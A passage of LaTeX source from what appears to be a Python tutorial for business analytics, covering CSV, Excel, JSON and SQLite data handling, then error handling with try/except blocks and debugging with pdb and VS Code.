\NormalTok{    writer }\OperatorTok{=}\NormalTok{ csv.writer(}\BuiltInTok{file}\NormalTok{)}
\NormalTok{    writer.writerow([}\StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Age\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Department\textquotesingle{}}\NormalTok{])}
\NormalTok{    writer.writerow([}\StringTok{\textquotesingle{}Alice\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}30\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}HR\textquotesingle{}}\NormalTok{])}
\NormalTok{    writer.writerow([}\StringTok{\textquotesingle{}Bob\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}25\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}IT\textquotesingle{}}\NormalTok{])}

\CommentTok{\# Write dictionary to CSV file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}output.csv\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{, newline}\OperatorTok{=}\StringTok{\textquotesingle{}\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    fieldnames }\OperatorTok{=}\NormalTok{ [}\StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Age\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Department\textquotesingle{}}\NormalTok{]}
\NormalTok{    writer }\OperatorTok{=}\NormalTok{ csv.DictWriter(}\BuiltInTok{file}\NormalTok{, fieldnames}\OperatorTok{=}\NormalTok{fieldnames)}
\NormalTok{    writer.writeheader()}
\NormalTok{    writer.writerow(\{}\StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Alice\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Age\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}30\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Department\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}HR\textquotesingle{}}\NormalTok{\})}
\NormalTok{    writer.writerow(\{}\StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Bob\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Age\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}25\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Department\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}IT\textquotesingle{}}\NormalTok{\})}
\end{Highlighting}
\end{Shaded}

\section{Reading and Writing Excel
Files}\label{reading-and-writing-excel-files}

Excel files are widely used in business analytics for data storage and
manipulation.

\subsection{Reading Excel Files}\label{reading-excel-files}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Read Excel file}
\NormalTok{df }\OperatorTok{=}\NormalTok{ pd.read\_excel(}\StringTok{\textquotesingle{}data.xlsx\textquotesingle{}}\NormalTok{, sheet\_name}\OperatorTok{=}\StringTok{\textquotesingle{}Sheet1\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(df)}
\end{Highlighting}
\end{Shaded}

\subsection{Writing Excel Files}\label{writing-excel-files}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Write to Excel file}
\NormalTok{df }\OperatorTok{=}\NormalTok{ pd.DataFrame(\{}
    \StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{: [}\StringTok{\textquotesingle{}Alice\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Bob\textquotesingle{}}\NormalTok{],}
    \StringTok{\textquotesingle{}Age\textquotesingle{}}\NormalTok{: [}\DecValTok{30}\NormalTok{, }\DecValTok{25}\NormalTok{],}
    \StringTok{\textquotesingle{}Department\textquotesingle{}}\NormalTok{: [}\StringTok{\textquotesingle{}HR\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}IT\textquotesingle{}}\NormalTok{]}
\NormalTok{\})}

\NormalTok{df.to\_excel(}\StringTok{\textquotesingle{}output.xlsx\textquotesingle{}}\NormalTok{, index}\OperatorTok{=}\VariableTok{False}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Handling JSON Data}\label{handling-json-data}

JSON (JavaScript Object Notation) is a lightweight data interchange
format.

\subsection{Reading JSON Data}\label{reading-json-data}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\CommentTok{\# Read JSON file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ json.load(}\BuiltInTok{file}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(data)}
\end{Highlighting}
\end{Shaded}

\subsection{Writing JSON Data}\label{writing-json-data}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\CommentTok{\# Write to JSON file}
\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{\textquotesingle{}name\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Alice\textquotesingle{}}\NormalTok{,}
    \StringTok{\textquotesingle{}age\textquotesingle{}}\NormalTok{: }\DecValTok{30}\NormalTok{,}
    \StringTok{\textquotesingle{}department\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}HR\textquotesingle{}}
\NormalTok{\}}

\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}output.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    json.dump(data, }\BuiltInTok{file}\NormalTok{, indent}\OperatorTok{=}\DecValTok{4}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Database Interaction}\label{database-interaction}

Interacting with databases is essential for managing and querying large
datasets in business analytics.

\subsection{Connecting to a SQLite
Database}\label{connecting-to-a-sqlite-database}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sqlite3}

\CommentTok{\# Connect to database}
\NormalTok{conn }\OperatorTok{=}\NormalTok{ sqlite3.}\ExtensionTok{connect}\NormalTok{(}\StringTok{\textquotesingle{}example.db\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Create a cursor object}
\NormalTok{cursor }\OperatorTok{=}\NormalTok{ conn.cursor()}

\CommentTok{\# Execute a query}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}CREATE TABLE IF NOT EXISTS employees (id INTEGER PRIMARY KEY, name TEXT, age INTEGER, department TEXT)\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Insert data}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}INSERT INTO employees (name, age, department) VALUES (?, ?, ?)\textquotesingle{}}\NormalTok{, (}\StringTok{\textquotesingle{}Alice\textquotesingle{}}\NormalTok{, }\DecValTok{30}\NormalTok{, }\StringTok{\textquotesingle{}HR\textquotesingle{}}\NormalTok{))}
\NormalTok{conn.commit()}

\CommentTok{\# Query data}
\NormalTok{cursor.execute(}\StringTok{\textquotesingle{}SELECT * FROM employees\textquotesingle{}}\NormalTok{)}
\NormalTok{rows }\OperatorTok{=}\NormalTok{ cursor.fetchall()}
\ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ rows:}
    \BuiltInTok{print}\NormalTok{(row)}

\CommentTok{\# Close the connection}
\NormalTok{conn.close()}
\end{Highlighting}
\end{Shaded}

\section{Working with Large Data
Sets}\label{working-with-large-data-sets}

Handling large datasets efficiently is crucial in business analytics.
The \texttt{pandas} library is often used for this purpose.

\subsection{Reading Large CSV Files in
Chunks}\label{reading-large-csv-files-in-chunks}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Read CSV file in chunks}
\NormalTok{chunk\_size }\OperatorTok{=} \DecValTok{1000}
\NormalTok{chunks }\OperatorTok{=}\NormalTok{ pd.read\_csv(}\StringTok{\textquotesingle{}large\_data.csv\textquotesingle{}}\NormalTok{, chunksize}\OperatorTok{=}\NormalTok{chunk\_size)}

\ControlFlowTok{for}\NormalTok{ chunk }\KeywordTok{in}\NormalTok{ chunks:}
\NormalTok{    process(chunk)  }\CommentTok{\# Replace with actual processing logic}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples in BAIS}\label{practical-examples-in-bais-2}

\subsection{Sales Data Analysis}\label{sales-data-analysis}

\textbf{Example: Analyzing Sales Data}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Read sales data from CSV}
\NormalTok{sales\_data }\OperatorTok{=}\NormalTok{ pd.read\_csv(}\StringTok{\textquotesingle{}sales\_data.csv\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Calculate total sales}
\NormalTok{total\_sales }\OperatorTok{=}\NormalTok{ sales\_data[}\StringTok{\textquotesingle{}Sales\textquotesingle{}}\NormalTok{].}\BuiltInTok{sum}\NormalTok{()}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Total Sales: }\SpecialCharTok{\{}\NormalTok{total\_sales}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Group sales by region}
\NormalTok{sales\_by\_region }\OperatorTok{=}\NormalTok{ sales\_data.groupby(}\StringTok{\textquotesingle{}Region\textquotesingle{}}\NormalTok{)[}\StringTok{\textquotesingle{}Sales\textquotesingle{}}\NormalTok{].}\BuiltInTok{sum}\NormalTok{()}
\BuiltInTok{print}\NormalTok{(sales\_by\_region)}
\end{Highlighting}
\end{Shaded}

\subsection{Customer Data Management}\label{customer-data-management}

\textbf{Example: Managing Customer Data}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\CommentTok{\# Read customer data from JSON}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}customers.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    customers }\OperatorTok{=}\NormalTok{ json.load(}\BuiltInTok{file}\NormalTok{)}

\CommentTok{\# Filter customers by age}
\NormalTok{young\_customers }\OperatorTok{=}\NormalTok{ [customer }\ControlFlowTok{for}\NormalTok{ customer }\KeywordTok{in}\NormalTok{ customers }\ControlFlowTok{if}\NormalTok{ customer[}\StringTok{\textquotesingle{}age\textquotesingle{}}\NormalTok{] }\OperatorTok{\textless{}} \DecValTok{30}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(young\_customers)}

\CommentTok{\# Write filtered data to new JSON file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}young\_customers.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    json.dump(young\_customers, }\BuiltInTok{file}\NormalTok{, indent}\OperatorTok{=}\DecValTok{4}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Best Practices for Data Handling and File
I/O}\label{best-practices-for-data-handling-and-file-io}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use Context Managers}: Always use context managers
  (\texttt{with} statements) for file operations to ensure proper
  resource management.
\item
  \textbf{Exception Handling}: Implement exception handling to manage
  errors during file operations.
\item
  \textbf{Data Validation}: Validate data before processing to avoid
  errors and inconsistencies.
\item
  \textbf{Efficient Processing}: Use efficient data processing
  techniques, especially for large datasets.
\item
  \textbf{Security}: Be mindful of security when handling sensitive
  data, such as using secure connections for database interactions and
  avoiding hardcoding sensitive information.
\end{enumerate}

\section{Conclusion}\label{conclusion-9}

In this tutorial, we covered the fundamentals of data handling and file
I/O in Python, with practical examples related to business analytics and
information systems. Mastering these skills will enable you to
efficiently manage and analyze data, a crucial aspect of BAIS. Whether
you are dealing with text files, CSVs, Excel sheets, JSON data, or
databases, Python provides a robust set of tools to handle your data
needs.

\bookmarksetup{startatroot}

\chapter{Introduction to Error Handling and Debugging in
Python}\label{introduction-to-error-handling-and-debugging-in-python}

Error handling and debugging are crucial skills for any programmer.
Proper error handling ensures your program can handle unexpected
situations gracefully, while effective debugging techniques help you
find and fix bugs more efficiently. This tutorial will cover
implementing error handling in Python using \texttt{try-except} blocks
and introduce debugging techniques using built-in Python functionalities
and IDE tools like Visual Studio Code.

\subsection{Error Handling in Python}\label{error-handling-in-python}

Error handling in Python is managed using \texttt{try-except} blocks,
which allow you to catch and handle exceptions gracefully, preventing
your program from crashing unexpectedly.

\subsubsection{Basic Try-Except Block}\label{basic-try-except-block}

The \texttt{try} block lets you test a block of code for errors, and the
\texttt{except} block lets you handle the error.

\paragraph{Example: Handling Division by
Zero}\label{example-handling-division-by-zero}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ divide(a, b):}
    \ControlFlowTok{try}\NormalTok{:}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ a }\OperatorTok{/}\NormalTok{ b}
    \ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Error: Division by zero is not allowed."}\NormalTok{)}
\NormalTok{        result }\OperatorTok{=} \VariableTok{None}
    \ControlFlowTok{return}\NormalTok{ result}

\CommentTok{\# Test the function}
\BuiltInTok{print}\NormalTok{(divide(}\DecValTok{10}\NormalTok{, }\DecValTok{2}\NormalTok{))  }\CommentTok{\# Output: 5.0}
\BuiltInTok{print}\NormalTok{(divide(}\DecValTok{10}\NormalTok{, }\DecValTok{0}\NormalTok{))  }\CommentTok{\# Output: Error: Division by zero is not allowed. None}
\end{Highlighting}
\end{Shaded}

\subsubsection{Catching Multiple
Exceptions}\label{catching-multiple-exceptions}

You can catch multiple exceptions by specifying different
\texttt{except} blocks for each type of error.

\paragraph{Example: Handling Different
Errors}\label{example-handling-different-errors}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ read\_file(filename):}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(filename, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{            content }\OperatorTok{=} \BuiltInTok{file}\NormalTok{.read()}
    \ControlFlowTok{except} \PreprocessorTok{FileNotFoundError}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Error: The file \textquotesingle{}}\SpecialCharTok{\{}\NormalTok{filename}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{} was not found."}\NormalTok{)}
\NormalTok{        content }\OperatorTok{=} \VariableTok{None}
    \ControlFlowTok{except} \PreprocessorTok{IOError}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Error: Could not read the file \textquotesingle{}}\SpecialCharTok{\{}\NormalTok{filename}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}."}\NormalTok{)}
\NormalTok{        content }\OperatorTok{=} \VariableTok{None}
    \ControlFlowTok{return}\NormalTok{ content}

\CommentTok{\# Test the function}
\BuiltInTok{print}\NormalTok{(read\_file(}\StringTok{\textquotesingle{}existing\_file.txt\textquotesingle{}}\NormalTok{))  }\CommentTok{\# Outputs file content}
\BuiltInTok{print}\NormalTok{(read\_file(}\StringTok{\textquotesingle{}non\_existing\_file.txt\textquotesingle{}}\NormalTok{))  }\CommentTok{\# Output: Error: The file \textquotesingle{}non\_existing\_file.txt\textquotesingle{} was not found.}
\end{Highlighting}
\end{Shaded}

\subsubsection{Using Else and Finally}\label{using-else-and-finally}

The \texttt{else} block can be used to execute code if no exceptions are
raised, and the \texttt{finally} block can be used to execute code
regardless of whether an exception was raised or not.

\paragraph{Example: Else and Finally
Blocks}\label{example-else-and-finally-blocks}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ process\_file(filename):}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(filename, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{            content }\OperatorTok{=} \BuiltInTok{file}\NormalTok{.read()}
    \ControlFlowTok{except} \PreprocessorTok{FileNotFoundError}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Error: The file \textquotesingle{}}\SpecialCharTok{\{}\NormalTok{filename}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{} was not found."}\NormalTok{)}
    \ControlFlowTok{else}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"File read successfully."}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ content}
    \ControlFlowTok{finally}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Finished file processing."}\NormalTok{)}

\CommentTok{\# Test the function}
\NormalTok{process\_file(}\StringTok{\textquotesingle{}existing\_file.txt\textquotesingle{}}\NormalTok{)  }\CommentTok{\# Output: File read successfully. Finished file processing.}
\NormalTok{process\_file(}\StringTok{\textquotesingle{}non\_existing\_file.txt\textquotesingle{}}\NormalTok{)  }\CommentTok{\# Output: Error: The file \textquotesingle{}non\_existing\_file.txt\textquotesingle{} was not found. Finished file processing.}
\end{Highlighting}
\end{Shaded}

\subsection{Debugging Techniques}\label{debugging-techniques}

Debugging is the process of finding and fixing bugs in your code.
Effective debugging involves understanding the flow of your program and
identifying where it deviates from expected behavior.

\subsubsection{Print Statements}\label{print-statements}

One of the simplest debugging techniques is using print statements to
track the flow of your program and inspect variables.

\paragraph{Example: Using Print
Statements}\label{example-using-print-statements}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_total\_price(price, quantity):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Price: }\SpecialCharTok{\{}\NormalTok{price}\SpecialCharTok{\}}\SpecialStringTok{, Quantity: }\SpecialCharTok{\{}\NormalTok{quantity}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{    total }\OperatorTok{=}\NormalTok{ price }\OperatorTok{*}\NormalTok{ quantity}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total: }\SpecialCharTok{\{}\NormalTok{total}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ total}

\CommentTok{\# Test the function}
\NormalTok{calculate\_total\_price(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{\texorpdfstring{Using the Built-in \texttt{pdb}
Module}{Using the Built-in pdb Module}}\label{using-the-built-in-pdb-module}

Python's built-in \texttt{pdb} module provides an interactive debugger
that allows you to set breakpoints, step through code, and inspect
variables.

\paragraph{\texorpdfstring{Example: Using \texttt{pdb} for
Debugging}{Example: Using pdb for Debugging}}\label{example-using-pdb-for-debugging}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pdb}

\KeywordTok{def}\NormalTok{ calculate\_total\_price(price, quantity):}
\NormalTok{    pdb.set\_trace()  }\CommentTok{\# Set a breakpoint}
\NormalTok{    total }\OperatorTok{=}\NormalTok{ price }\OperatorTok{*}\NormalTok{ quantity}
    \ControlFlowTok{return}\NormalTok{ total}

\CommentTok{\# Test the function}
\NormalTok{calculate\_total\_price(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Run the script in your terminal, and the \texttt{pdb} debugger will
start at the breakpoint, allowing you to inspect variables and step
through the code.

\subsubsection{Debugging with Visual Studio
Code}\label{debugging-with-visual-studio-code}

Visual Studio Code (VS Code) is a popular IDE that provides powerful
debugging tools. Here's how to use VS Code for debugging Python code:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Set Up a Debug Configuration}:

  \begin{itemize}
  \item
    Open VS Code and load your Python project.
  \item
    Click on the Debug icon on the left sidebar.
  \item
    Click on the gear icon to open the \texttt{launch.json} file.
  \item
    Add a new configuration for Python:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}
    \DataTypeTok{"name"}\FunctionTok{:} \StringTok{"Python: Current File"}\FunctionTok{,}
    \DataTypeTok{"type"}\FunctionTok{:} \StringTok{"python"}\FunctionTok{,}
    \DataTypeTok{"request"}\FunctionTok{:} \StringTok{"launch"}\FunctionTok{,}
    \DataTypeTok{"program"}\FunctionTok{:} \StringTok{"$\{file\}"}
\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}
  \end{itemize}
\item
  \textbf{Set Breakpoints}:

  \begin{itemize}
  \tightlist
  \item
    Click in the gutter next to the line number where you want to set a
    breakpoint. A red dot will appear, indicating a breakpoint.
  \end{itemize}
\item
  \textbf{Start Debugging}:

  \begin{itemize}
  \tightlist
  \item
    Click the green play button in the Debug panel or press \texttt{F5}
    to start debugging.
  \item
    The program will run until it hits a breakpoint, allowing you to
    inspect variables, step through code, and evaluate expressions.
  \end{itemize}
\end{enumerate}

\subsubsection{Example: Debugging with VS
Code}\label{example-debugging-with-vs-code}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Open your Python script in VS Code.
\item
  Set a breakpoint in the \texttt{calculate\_total\_price} function.
\item
  Start the debugger and inspect the variables when the breakpoint is
  hit.
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_total\_price(price, quantity):}
\NormalTok{    total }\OperatorTok{=}\NormalTok{ price }\OperatorTok{*}\NormalTok{ quantity}
    \ControlFlowTok{return}\NormalTok{ total}

\CommentTok{\# Test the function}
\NormalTok{calculate\_total\_price(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-10}

Error handling and debugging are essential skills for writing robust and
reliable Python programs. By using \texttt{try-except} blocks, you can
gracefully handle errors and ensure your program runs smoothly.
Debugging techniques, such as print statements, the \texttt{pdb} module,
and IDE tools like Visual Studio Code, help you identify and fix bugs
more efficiently. Mastering these skills will make you a more effective
and productive programmer.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial on Error Handling and Debugging in
Python}\label{deep-dive-tutorial-on-error-handling-and-debugging-in-python}

Effective error handling and debugging are crucial for writing robust
and maintainable code in Python. This tutorial provides a comprehensive
guide to error handling using \texttt{try}, \texttt{except},
\texttt{else}, and \texttt{finally} blocks, as well as debugging
techniques using the \texttt{pdb} module.

\section{Table of Contents}\label{table-of-contents-5}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-error-handling]{Introduction to Error
  Handling}
\item
  \hyperref[try-and-except-blocks]{\texttt{try} and \texttt{except}
  Blocks}
\item
  \hyperref[handling-multiple-exceptions]{Handling Multiple Exceptions}
\item
  \hyperref[else-block]{\texttt{else} Block}
\item
  \hyperref[finally-block]{\texttt{finally} Block}
\item
  \hyperref[raising-exceptions]{Raising Exceptions}
\item
  \hyperref[custom-exceptions]{Custom Exceptions}
\item
  \hyperref[introduction-to-debugging]{Introduction to Debugging}
\item
  \hyperref[using-the-pdb-module]{Using the \texttt{pdb} Module}
\item
  \hyperref[practical-examples]{Practical Examples}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[example-1-file-operations]{Example 1: File Operations}
  \item
    \hyperref[example-2-network-operations]{Example 2: Network
    Operations}
  \end{itemize}
\item
  \hyperref[best-practices-for-error-handling-and-debugging]{Best
  Practices for Error Handling and Debugging}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Error
Handling}\label{introduction-to-error-handling}

Error handling in Python is managed using the \texttt{try},
\texttt{except}, \texttt{else}, and \texttt{finally} blocks. These
constructs allow you to catch and handle exceptions gracefully, ensuring
that your program can recover from errors or exit cleanly.

\section{\texorpdfstring{\texttt{try} and \texttt{except}
Blocks}{try and except Blocks}}\label{try-and-except-blocks}

The \texttt{try} block lets you test a block of code for errors. The
\texttt{except} block lets you handle the error.

\subsection{Basic Syntax}\label{basic-syntax}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
    \CommentTok{\# Code that may raise an exception}
\NormalTok{    result }\OperatorTok{=} \DecValTok{10} \OperatorTok{/} \DecValTok{0}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
    \CommentTok{\# Code to handle the exception}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"You cannot divide by zero!"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example}\label{example}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    number }\OperatorTok{=} \BuiltInTok{int}\NormalTok{(}\BuiltInTok{input}\NormalTok{(}\StringTok{"Enter a number: "}\NormalTok{))}
\NormalTok{    result }\OperatorTok{=} \DecValTok{100} \OperatorTok{/}\NormalTok{ number}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Result: }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"You cannot divide by zero!"}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ValueError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Invalid input. Please enter a numeric value."}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Handling Multiple
Exceptions}\label{handling-multiple-exceptions}

You can handle multiple exceptions by specifying multiple
\texttt{except} blocks.

\subsection{Example}\label{example-1}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
    \BuiltInTok{file} \OperatorTok{=} \BuiltInTok{open}\NormalTok{(}\StringTok{"data.txt"}\NormalTok{, }\StringTok{"r"}\NormalTok{)}
\NormalTok{    number }\OperatorTok{=} \BuiltInTok{int}\NormalTok{(}\BuiltInTok{file}\NormalTok{.readline())}
\NormalTok{    result }\OperatorTok{=} \DecValTok{100} \OperatorTok{/}\NormalTok{ number}
\ControlFlowTok{except} \PreprocessorTok{FileNotFoundError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"The file was not found."}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"You cannot divide by zero!"}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ValueError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Invalid number in the file."}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{\texorpdfstring{\texttt{else}
Block}{else Block}}\label{else-block}

The \texttt{else} block executes if no exceptions were raised in the
\texttt{try} block.

\subsection{Example}\label{example-2}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    number }\OperatorTok{=} \BuiltInTok{int}\NormalTok{(}\BuiltInTok{input}\NormalTok{(}\StringTok{"Enter a number: "}\NormalTok{))}
\NormalTok{    result }\OperatorTok{=} \DecValTok{100} \OperatorTok{/}\NormalTok{ number}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"You cannot divide by zero!"}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ValueError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Invalid input. Please enter a numeric value."}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Result: }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{\texorpdfstring{\texttt{finally}
Block}{finally Block}}\label{finally-block}

The \texttt{finally} block lets you execute code, regardless of whether
an exception was raised or not.

\subsection{Example}\label{example-3}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    number }\OperatorTok{=} \BuiltInTok{int}\NormalTok{(}\BuiltInTok{input}\NormalTok{(}\StringTok{"Enter a number: "}\NormalTok{))}
\NormalTok{    result }\OperatorTok{=} \DecValTok{100} \OperatorTok{/}\NormalTok{ number}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"You cannot divide by zero!"}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ValueError}\NormalTok{:}
